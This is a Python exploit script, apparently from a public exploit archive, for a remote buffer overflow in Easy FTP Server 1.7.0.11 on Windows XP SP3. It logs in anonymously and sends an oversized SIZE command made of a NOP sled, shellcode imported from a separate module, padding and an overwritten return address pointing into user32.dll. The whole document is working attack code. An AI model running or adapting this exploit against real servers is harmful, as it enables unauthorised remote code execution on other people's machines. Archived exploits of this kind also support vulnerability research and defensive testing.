# Exploit Title: Easy FTP Server v1.7.0.11 NLST , NLST -al, APPE, RETR , SIZE  and XCWD Commands Remote Buffer Overflow Exploit
# Date: 10/8/2010
# Author: Rabih Mohsen
# Software Link:http://code.google.com/p/easyftpsvr/downloads/detail?name=easyftp-server-1.7.0.11-cn.zip
# Version: 1.7.0.11
# Tested on: Windows XP SP3 
# CVE:

import socket, sys

from time import sleep
from base64 import b64encode
from payload import buf
import socket

def shell_attack(target_machine, target_port):

	buffersize = 272

	CMDS  =  b"SIZE"
	eip = b"\x91\xC8\x41\x7E" # CALL EDI - user32.dll
	nopsled = b"\x90" * 16

	payload = b"\x90" * (buffersize-(len(nopsled)+len(buf)))

	# target, CMDS: anny of the "NLST , NLST -al, APPE, RETR , SIZE  and XCWD"

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect = s.connect((target_machine, target_port))
	s.recv(1024)
	s.send(b'User anonymous\r\n')
	s.recv(1024)
	s.send(b'PASS anonymous\r\n')
	s.send(CMDS +b" " + nopsled+buf+payload+eip+b'\r\n')
	s.recv(1024)
	s.send(b'QUIT EASY ftp\r\n')
	s.close()

	
	

	